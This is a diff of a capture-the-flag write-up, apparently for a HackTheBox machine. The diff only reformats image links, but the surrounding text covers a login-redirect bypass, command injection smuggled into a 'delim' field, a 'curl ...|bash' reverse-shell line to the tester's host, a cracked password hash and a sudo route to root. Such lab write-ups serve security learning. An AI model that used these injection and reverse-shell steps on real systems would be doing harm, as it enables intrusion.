@@ -19,23 +19,23 @@ PORT   STATE SERVICE
 
 Port 80 had a login page to some kind of file manager:
 
-<figure><img src="../../../.gitbook/assets/image (2627).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2627).png>)
 
 This wasn't vulnerable to SQL Injection or anything. I tried visiting `index.php`, but was redirected back to the `login.php`. When the traffic is inspectedi nBurp, I noticed that `index.php` was still loaded.
 
-<figure><img src="../../../.gitbook/assets/image (1087).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1087).png>)
 
 This means that we can view the pages without logging in since they are loaded before we are redirected. When I used Burp's Match and Replace function to change the 302 Found to 200 OK, I could load the page normally:
 
-<figure><img src="../../../.gitbook/assets/image (2176).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2176).png>)
 
 Within the Accounts tab, we can add a user.
 
-<figure><img src="../../../.gitbook/assets/image (2714).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2714).png>)
 
 So I created one and we can remove the Burpsuite filtering. Within the Files tab, there's a backup of the entire site uploaded.
 
-<figure><img src="../../../.gitbook/assets/image (4042).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4042).png>)
 
 We can download this file and analyse the source code back on my machine. Here's the `logs.php`.
 
@@ -104,11 +104,11 @@ Upgrade-Insecure-Requests: 1
 delim=comma; ping -c 1 10.10.14.13 
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2586).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2586).png>)
 
 Now, we can get a reverse shell by using `curl http://10.10.14.13/shell.sh|bash`.
 
-<figure><img src="../../../.gitbook/assets/image (394).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(394).png>)
 
 ## Privilege Escalation
 
@@ -157,7 +157,7 @@ $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
 
 We can then `su` to `m4lwhere`.
 
-<figure><img src="../../../.gitbook/assets/image (1885).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1885).png>)
 
 ### Sudo Privileges
 
@@ -195,4 +195,4 @@ m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh
 
 It's easy to get a `root` shell afterwards.
 
-<figure><img src="../../../.gitbook/assets/image (1086).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1086).png>)
